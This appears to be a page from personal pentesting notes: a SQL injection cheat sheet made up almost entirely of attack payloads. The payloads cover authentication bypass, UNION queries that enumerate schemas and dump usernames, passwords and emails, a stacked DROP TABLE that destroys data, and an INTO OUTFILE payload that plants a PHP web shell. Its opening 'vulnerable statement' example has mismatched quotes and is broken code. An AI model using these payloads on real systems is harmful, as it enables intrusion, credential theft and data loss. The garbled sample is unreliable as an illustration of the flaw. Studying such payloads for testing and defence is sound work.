# SQL Injection

[HOME](../index.html) / [Web](./)

## The basics

How an example of unsecure sql statement looks like:

```
$SQL = "SELECT * FROM {tablename} WHERE {username} = ' + $_POST["username"] + ' AND ' + $_POST['password']'";
```

To break the statement:

```
$SQL = "SELECT * FROM {tablename} WHERE {username} = ' + 1' OR 1+1-- + ' AND ' + $_POST['password']'";
```

Order by:

```
=1 order by 1
=1 order by 2
=1 order by 3
.
.
.
Until error occurs, then:
=1 union all select 1, 2, 3...
=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
=1 union all select 1, username, password from users

' union select 1,2,3,concat(schema_name, ':') from information_schema.schemata-- -    # db name
' union select 1,2,3,concat(table_name, ':') from information_schema.tables where table_schema = '[DB_NAME]'-- -   # table name
' union select 1,2,3,concat(column_name, ':') from information_schema.columns where table_name = '[TABLE_NAME]'-- -   # column name
' union select 1,2,3,concat(id, ':', name, ':', email, ':', password) from user-- -   # column content
```

### Simple SQL injection test

```
'
1' OR 1+1--
\'
```

### Stacked injection; Where table name is known

```
1'; DROP TABLE {tablename} --
```

### Where column name is known

```
1'; ALTER TABLE {tablename} ALTER COLUMN {columnname} {datatype} --
1' UNION SELECT {columnname} FROM {tablename};--
1' UNION ALL SELECT {columnname} FROM {tablename};--
```

\


## Blind injection

Apply in URL

```
www.example.com/xxx.php?id=1 or 1=1
```

## RCE with UNION

```
123' UNION SELECT '<?php echo system("ls -la /");?>','2','3','4','5' into outfile '/var/www/html/shell.php'#
```

## Oracle DB

```
' UNION SELECT table_name,null,null FROM all_tables--
' UNION SELECT  column_name,null,null FROM all_tab_columns WHERE table_name=''--
' UNION SELECT [col1],[col2],null FROM [table]--
```
